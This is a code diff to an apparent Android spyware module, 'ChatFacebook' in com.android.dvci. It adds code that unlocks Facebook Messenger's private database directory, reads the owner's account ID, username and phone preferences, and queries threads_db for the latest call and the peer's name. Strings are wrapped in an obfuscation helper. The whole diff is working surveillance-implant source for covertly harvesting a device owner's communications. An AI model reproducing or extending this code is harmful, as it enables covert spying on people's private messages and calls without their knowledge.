@@ -22,6 +22,7 @@ import com.android.dvci.db.RecordListVisitor;
 import com.android.dvci.db.RecordVisitor;
 import com.android.dvci.file.Path;
 import com.android.dvci.module.ModuleAddressBook;
+import com.android.dvci.module.call.CallInfo;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.StringUtils;
 import com.android.mm.M;
@@ -39,14 +40,17 @@ public class ChatFacebook extends SubModuleChat {
 	Semaphore readChatSemaphore = new Semaphore(1, true);
 
 	// private String dbDir;
-	private String account_uid;
+	private static String account_uid;
+	private static String account_name;
+	private static String phone_number;
+	private static String phone_confirmed;
 
-	private String account_name;
 
-	String dirKatana = M.e("/data/data/com.facebook.katana/databases");
-	String dirOrca = M.e("/data/data/com.facebook.orca/databases");
+	static String dirKatana = M.e("/data/data/com.facebook.katana/databases");
+	static String dirOrca = M.e("/data/data/com.facebook.orca/databases");
 
 	private Hashtable<String, Contact> contacts = new Hashtable<String, Contact>();
+
 
 	@Override
 	public int getProgramId() {
@@ -76,8 +80,14 @@ public class ChatFacebook extends SubModuleChat {
 		if (!fetchFb(dirOrca)) {
 			fetchFb(dirKatana);
 		}
+		//getCurrentCall(new CallInfo(false));
 	}
 
+	static public void getAccountInfo() {
+		if (!readMyAccount(dirOrca)) {
+			readMyAccount(dirKatana);
+		}
+	}
 	private boolean fetchFb(String dir) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (fetchFb) " + dir);
@@ -97,7 +107,11 @@ public class ChatFacebook extends SubModuleChat {
 		}
 	}
 
-	private boolean readMyAccount(String dbDir) {
+	static public String getPhone_number() {
+		return phone_number;
+	}
+
+	private static boolean readMyAccount(String dbDir) {
 
 		String dbFile = M.e("prefs_db");
 
@@ -126,6 +140,12 @@ public class ChatFacebook extends SubModuleChat {
 
 			account_uid = preferences.get(M.e("/auth/user_data/fb_uid"));
 			account_name = preferences.get(M.e("/auth/user_data/fb_username"));
+			phone_number = account_name;
+			/* are we interested to the phone registration number?
+			phone_number = preferences.get(M.e("/config/neue/validated_phonenumber"));
+			phone_confirmed = preferences.get(M.e("/config/neue/phone_confirmed"));
+			* /
+
 
 			if (StringUtils.isEmpty(account_name)) {
 				String account_user = preferences.get(M.e("/auth/user_data/fb_me_user"));
@@ -140,7 +160,11 @@ public class ChatFacebook extends SubModuleChat {
 					}
 				}
 			}
-
+			/* are we interested to the phone registration number?
+			if(StringUtils.isEmpty(phone_number)){
+				phone_number = account_name;
+			}
+			*/
 			return (!StringUtils.isEmpty(account_name) && !StringUtils.isEmpty(account_uid));
 		}finally{
 			helper.disposeDb();
@@ -148,6 +172,108 @@ public class ChatFacebook extends SubModuleChat {
 
 	}
 
+	public static boolean getCurrentCall( final CallInfo callInfo) {
+		RecordVisitor visitor = new RecordVisitor() {
+
+			@Override
+			public long cursor(Cursor cursor) {
+				Long timestamp = cursor.getLong(1);
+				callInfo.id=Math.abs(timestamp.hashCode());
+				if (callInfo.valid == false) {
+					callInfo.peer = "unknown";
+					int msg_type = cursor.getInt(0);
+
+					if (msg_type == 100 || msg_type == 102) {
+						String participants = cursor.getString(2);
+
+						try {
+							JSONArray parts = (JSONArray) new JSONTokener(participants).nextValue();
+							if (parts != null) {
+								for (int i = parts.length() - 1; i >= 0; i--) {
+									JSONObject p = parts.getJSONObject(i);
+									if (p != null && p.getString(M.e("user_key")) != null) {
+										String user_key = p.getString(M.e("user_key"));
+										if (user_key.split(":").length < 2)
+											continue;
+										user_key = user_key.split(":")[1];
+										if (Cfg.DEBUG) {
+											Check.log(TAG + " (getCurrentCall) Checking \"" + user_key +"\" against \"" + account_uid + "\"" );
+										}
+										if (!user_key.equalsIgnoreCase(account_uid)) {
+											if (Cfg.DEBUG) {
+												Check.log(TAG + " (getCurrentCall) differs !" );
+											}
+											/* found peer */
+											if (p.getString(M.e("name")) != null) {
+												callInfo.peer = p.getString(M.e("name"));
+											}
+											break;
+										}else{
+											if (Cfg.DEBUG) {
+												Check.log(TAG + " (getCurrentCall) is equal !" );
+											}
+										}
+									}
+								}
+							}
+						} catch (Exception e) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (getCurrentCall) Error: " + e);
+							}
+						}
+						callInfo.account = account_name;
+						// ok we found the last valid call, mark as valid to avoid the other.
+						callInfo.timestamp = new Date(timestamp);
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (getCurrentCall) call type: " + msg_type);
+						}
+						callInfo.incoming = msg_type == 100;
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (getCurrentCall) incoming: " + callInfo.incoming + " timestamp=" + timestamp);
+						}
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (getCurrentCall) user: " + callInfo.account + " account_id:" + account_uid + " peer: " + callInfo.peer + " timestamp:" + timestamp);
+						}
+						callInfo.valid = true;
+					}
+				}
+				return callInfo.id;
+			}
+		};
+		callInfo.valid = false;
+		String dbDir;
+		if (Path.unprotectAll(dirOrca, true)) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getCurrentCall) db dir id %s", dirOrca);
+			}
+			dbDir = dirOrca;
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getCurrentCall) cannot access db directory");
+			}
+			return false;
+		}
+
+		String dbFile1 = M.e("threads_db");
+		String dbFile2 = M.e("threads_db2");
+
+		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile1);
+		if (helper == null) {
+			helper = GenericSqliteHelper.open(dbDir, dbFile2);
+		}
+		if (helper == null) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getCurrentCall) Error: null helper, dbFileNot available");
+			}
+			return false;
+		}
+
+		String sqlQuery = M.e("select m.msg_type, m.timestamp_ms, t.participants from messages as m join threads as t on t.thread_key=m.thread_key") +
+				M.e(" where (m.msg_type = 100 or m.msg_type = 102 ) and m.timestamp_ms > 0 order by m.timestamp_ms desc limit 1  ");
+		helper.traverseRawQuery(sqlQuery, new String[]{}, visitor);
+		helper.disposeDb();
+		return callInfo.valid;
+	}
 	private void readFbMessageHistory(String dbDir) {
 		if (!readChatSemaphore.tryAcquire()) {
 			if (Cfg.DEBUG) {
@@ -314,20 +440,20 @@ public class ChatFacebook extends SubModuleChat {
 
 	private void updateMarkupFb(String threadId, long newLastId, boolean serialize) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (updateMarkupSkype), mailStore: " + threadId + " +lastId: " + newLastId);
+			Check.log(TAG + " (updateMarkupFb), mailStore: " + threadId + " +lastId: " + newLastId);
 		}
 
 		lastFb.put(threadId, newLastId);
 		try {
 			if (serialize || (newLastId % 10 == 0)) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (updateMarkupSkype), write lastId: " + newLastId);
+					Check.log(TAG + " (updateMarkupFb), write lastId: " + newLastId);
 				}
 				markup.writeMarkupSerializable(lastFb);
 			}
 		} catch (IOException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (updateMarkupSkype) Error: " + e);
+				Check.log(TAG + " (updateMarkupFb) Error: " + e);
 			}
 		}
 	}
